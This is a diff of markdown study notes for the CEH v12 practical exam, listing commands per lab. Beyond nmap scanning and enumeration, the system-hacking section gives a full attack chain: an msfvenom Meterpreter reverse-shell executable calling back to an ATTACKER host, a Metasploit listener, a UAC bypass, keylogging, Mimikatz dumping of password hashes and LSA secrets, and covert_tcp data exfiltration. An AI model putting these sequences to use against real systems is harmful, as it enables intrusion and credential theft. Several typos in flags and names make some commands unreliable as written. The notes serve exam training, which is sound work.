@@ -1,11 +1,16 @@
 # CEH-v12-Practical
-**Module 03: Scanning Networks**
 
-**Lab1-Task1: Host discovery**
+## Module 03: Scanning Networks
+
+*https://www.scribd.com/document/662370340/CEH-v12-LabManual-p01*
+
+### Lab1-Task1: Host discovery (Page 224)
 
 - **nmap -sn -PR [IP]**
   - **-sn:** Disable port scan
   - **-PR:** ARP ping scan
+- **nmap -sn -PR [RANGE] -oG [FILE]**
+  - **-oG:** Grepable output to file
 - **nmap -sn -PU [IP]**
   - **-PU:** UDP ping scan
 - **nmap -sn -PE [IP or IP Range]**
@@ -21,21 +26,25 @@
 - **nmap -sn -PO [IP]**
   - **-PO:** IP Protocol Ping scan
 
-**Lab2-Task3: Port and Service Discovery**
+### Lab2-Task4: Port and Service Discovery (Page 251)
 
 - **nmap -sT -v [IP]**
   - **-sT:** TCP connect/full open scan
   - **-v:** Verbose output
 - **nmap -sS -v [IP]**
   - **-sS:** Stealth scan/TCP hall-open scan
+  - *Can be used to bypass firewall*
 - **nmap -sX -v [IP]**
   - **-sX:** Xmax scan
 - **nmap -sM -v [IP]**
   - **-sM:** TCP Maimon scan
 - **nmap -sA -v [IP]**
   - **-sA:** ACK flag probe scan
+  - *No response means filtered: stateful firewall present*
 - **nmap -sU -v [IP]**
   - **-sU:** UDP scan
+- **nmap -sN -T4 [IP]**
+  - **-sN:** NULL scan
 - **nmap -sI -v [IP]**
   - **-sI:** IDLE/IPID Header scan
 - **nmap -sY -v [IP]**
@@ -44,34 +53,64 @@
   - **-sZ:** SCTP COOKIE ECHO Scan
 - **nmap -sV -v [IP]**
   - **-sV:** Detect service versions
-- **nmap -A -v [IP]**
-  - **-A:** Aggressive scan
 
-**Lab3-Task2: OS Discovery**
+### Lab3-Task2: OS Discovery (Page 280)
 
 - **nmap -A -v [IP]**
-  - **-A:** Aggressive scan
+  - **-A:** Aggressive (-O -sV -sC --traceroute)
 - **nmap -O -v [IP]**
   - **-O:** OS discovery
-- **nmap –script smb-os-discovery.nse [IP]**
+- **nmap –-script smb-os-discovery.nse [IP]**
   - **-–script:** Specify the customized script
   - **smb-os-discovery.nse:** Determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (Port 445 or 139)
 
-**Module 04: Enumeration**
+- Useful
+  - **nmap -sC -sV -p- -A -v -O -T4 [IP]**
+    - **-sC:** Performs a script scan using the default set of scripts.
+  - List of nmap scripts: https://nmap.org/nsedoc/scripts/
 
-**Lab2-Task1: Enumerate SNMP using snmp-check**
+## Module 04: Enumeration (Page 351)
+*NetBIOS, SNMP, LDAP, NFS, DNS, SMTP, RPC, SMB, FTP*
 
-- nmap -sU -p 161 [IP]
+### Lab1-Task1: NetBIOS enumeration using nbstat (Page 357)
+
+- **nbtstat -a [IP]**
+  - **-a:** Display NetBIOS name table
+- **nbtstat -c**
+  - **-c:** List content of the NetBIOS name cache
+
+### Lab1-Task3: NetBIOS enumeration using NSE Script (Page 361)
+
+- **nmap -sV -v --script nbstat.nse [IP]**
+  - **nbstat.nse:** Performs NetBIOS enumeration
+
+### Lab2-Task1: Enumerate SNMP using snmp-check (Page 365)
+
+- **nmap -sU -p 161 [IP]**
+  - *Check if SNMP port is open*
 - **snmp-check [IP]**
 
-**Addition**
+### Lab2-Task4: Enumerate SNMP using NSE (Page 379)
 
-- nbtstat -a [IP] (Windows)
-- nbtstat -c
+- **nmap -sU -p 161 --script snmp-sysdescr [IP]**
+  - **snmp-sysdescr:** Server type and OS details
+- **nmap -sU -p 161 --script snmp-processes [IP]**
+  - **snmp-processes:** Running processes and associated ports
+- **nmap -sU -p 161 --script snmp-win32-software [IP]**
+  - **snmp-win32-software:** Applications running on Windows machine
+- **nmap -sU -p 161 --script snmp-interfaces [IP]**
+  - **snmp-win32-software:** Information about OS, network interfaces and applications installed
 
-**Module 06: System Hacking**
+- Other:
+  - *SMB enumeration*:
+    - **nmap -p 445 --script smb-enum-shares [IP]**
+    - **nmap -p 445 --script smb-enum-users --script-args smbusername=xx,smbpassword=xx  [IP]**
+  - *RDP scanner*:
+    - In Metasploit: **use auxiliary/scanner/rdp/rdp_scanner**
 
-**Lab1-Task1: Perform Active Online Attack to Crack the System&#39;s Password using Responder**
+## Module 06: System Hacking
+
+### Lab1-Task1: Perform Active Online Attack to Crack the System's Password using Responder (Page 572)
 
 - **Linux:**
   - cd
@@ -79,42 +118,81 @@
   - chmox +x ./Responder.py
   - **sudo ./Responder.py -I eth0**
   - passwd: \*\*\*\*
-- **Windows**
-  - run
-  - \\CEH-Tools
+
 - **Linux:**
   - Home/Responder/logs/SMB-NTMLv2-SSP-[IP].txt
   - sudo snap install john-the-ripper
   - passwd: \*\*\*\*
   - **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**
 
-**Lab3-Task6: Covert Channels using Covert\_TCP**
+
+*https://www.scribd.com/document/662370313/CEH-v12-LabManual-p02*
+
+### Lab2-Task1: Escalate privileges using privilege escalation tools... (Page 75)
+
+- Create malicious executable
+  - **msfvenom -p windows/meterpreter/reverse_tcp --platfrom windows -a x86 -e x86/shitaka_ga_nai -b "\x00" LHOST=ATTACKER -f exe > EXE_FILE**
+
+- Listener:
+  - **msfconsole**
+  - *use exploit/multi/handler*
+  - *set payload windows/meterpreter/reverse_tcp*
+  - *set LHOST ATTACKER*
+  - *exploit -j -z*
+- After executing file on VICTIM
+  - *session -i X*
+  - *getuid*
+- Dump hash
+  - *run post/windows/gather/smart_hashdump*
+  - If insufficient privileges:
+    - *getsystem -t 1*
+  - If still problems then:
+    - *background*
+    - *use exploit/windows/local/bypassuac_fodhelper*
+    - *set SESSION X*
+
+### Lab2-Task2: Hack a Windows Machine using Metasploit and perform post-exploitation using Meterpreter (Page 101)
+- Using steps from previous lab and after getting a Meterpreter session.
+  - *sysinfo, getuid, search -f FILE, keyscan_start, keyscan_dump, shell, dir /a:h, sc queryex type=service state=all, wmic*
+
+### Lab2-Task6: Escalate privilegesto gather hashdump using Mimikatz (Page 147)
+- After having a privileged Meterpreter session
+  - *load kiwi*
+  - *lsa_dump_sam*
+    - Load NTLM Hash of all users
+  - *lsa_dump_secrets*
+    - LSA secrets that contain User password, IE passwords, service account passwords, SQL passwords.
+  - *password_change -u Admin -n NTLM_HASH -P NEW_PASSWORD*
+
+### Lab3-Task4: Hide data using white space steganography (Page 204)
+- Hide content
+  - **snow -C -m "MESSAGE" -p "PASSWORD" ORIGINAL_FILE NEW_FILE**
+- Reveal content
+  - **snow -C -p "PASSWORD" NEW_FILE**
+
+### Lab3-Task5: Image steganography using OpenStego and StegOnline (Page 208)
+ - **OpenStego**: Hide/Extract
+ - **StegOnline**: https://stegonline.georgeom.net
+
+### Lab3-Task9: Covert Channels using Covert_TCP (Page 266)
 
 - **Attacker:**
-  - cd Desktop
-  - mkdir Send
-  - cd Send
-  - echo &quot;Secret&quot;->message.txt
-  - Place->Network
-  - Ctrl+L
-  - **smb://[IP]**
-  - Account &amp; Password
-  - copy and paste covert\_tcp.c
-  - **cc -o covert\_tcp covert\_tcp.c**
+  - Create a file with a secret: echo "Secret"->message.txt
+  - Copy and paste **covert_tcp.c**
+  - Compile: **cc -o covert_tcp covert_tcp.c**
 - **Target:**
   - **tcpdump -nvvx port 8888 -I lo**
-  - cd Desktop
-  - mkdir Receive
-  - cd Receive
-  - File->Ctrl+L
-  - smb://[IP]
-  - copy and paste covert\_tcp.c
-  - cc -o covert\_tcp covert\_tcp.c
-  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
+  - Copy and paste **covert_tcp.c**
+  - Compile: **cc -o covert_tcp covert_tcp.c**
+  - **./covert_tcp -dest TARGET_IP -source ATTACKER_IP -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
   - **Tcpdump captures no packets**
 - **Attacker**
-  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
+  - **./covert_tcp -dest TARGET_IP -source ATTACKER_IP -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/send/message.txt**
   - Wireshark (message string being send in individual packet)
+
+
+
+
 
 **Module 08: Sniffing**
 
